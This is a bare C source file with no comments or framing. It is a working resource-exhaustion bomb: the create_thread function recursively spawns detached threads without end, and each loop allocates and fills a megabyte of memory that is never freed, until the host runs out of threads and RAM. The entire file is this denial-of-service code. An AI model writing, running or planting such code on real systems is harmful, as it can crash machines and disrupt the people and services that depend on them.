 
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <pthread.h>
 
void* create_thread(void* arg) {
    while(1) {
        pthread_t thread;
        if(pthread_create(&thread, NULL, create_thread, NULL) >= 0) {
            pthread_detach(thread);

            int memory = 1024 * 1024;
            void* ptr = malloc(memory);
            if (ptr != NULL) {
                memset(ptr, 'm', memory);
            }
        }
    }
}

int main() {
    create_thread(NULL);
}